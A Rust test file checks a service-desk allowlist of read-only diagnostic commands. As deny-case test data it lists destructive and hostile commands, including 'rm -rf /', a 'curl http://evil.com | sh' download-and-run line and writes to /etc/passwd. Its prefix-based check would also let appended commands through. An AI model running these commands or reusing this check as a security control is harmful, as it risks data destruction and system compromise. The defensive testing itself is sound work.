//! Integration tests for service desk probe security.
//!
//! These tests verify:
//! - Probe allowlist security
//! - Only safe, read-only commands are allowed

// === Probe Allowlist Constants (mirrors service_desk.rs) ===

const ALLOWED_PROBES: &[&str] = &[
    "ps aux --sort=-%mem",
    "ps aux --sort=-%cpu",
    "lscpu",
    "free -h",
    "df -h",
    "lsblk",
    "ip addr show",
    "ip route",
    "ss -tulpn",
    "systemctl --failed",
    "journalctl -p warning..alert -n 200 --no-pager",
];

fn is_probe_allowed(probe: &str) -> bool {
    ALLOWED_PROBES.iter().any(|p| probe.starts_with(p))
}

// === Probe Allowlist Security Tests ===

#[test]
fn test_allowed_probes_are_safe() {
    // All allowed probes should be read-only
    for probe in ALLOWED_PROBES {
        // No write operations
        assert!(
            !probe.contains("rm "),
            "Probe should not remove files: {}",
            probe
        );
        assert!(!probe.contains("dd "), "Probe should not use dd: {}", probe);
        assert!(
            !probe.contains("mkfs"),
            "Probe should not format: {}",
            probe
        );
        assert!(!probe.contains(">"), "Probe should not redirect: {}", probe);
        assert!(
            !probe.contains("| sh"),
            "Probe should not pipe to shell: {}",
            probe
        );
    }
}

#[test]
fn test_dangerous_commands_denied() {
    assert!(!is_probe_allowed("rm -rf /"));
    assert!(!is_probe_allowed("dd if=/dev/zero"));
    assert!(!is_probe_allowed("curl http://evil.com | sh"));
    assert!(!is_probe_allowed("chmod 777 /etc/passwd"));
    assert!(!is_probe_allowed("echo 'hacked' > /etc/passwd"));
}

#[test]
fn test_partial_matches_work() {
    // Probes that start with allowed commands should work
    assert!(is_probe_allowed("ps aux --sort=-%mem"));
    assert!(is_probe_allowed("df -h"));
    assert!(is_probe_allowed("ip addr show"));
}
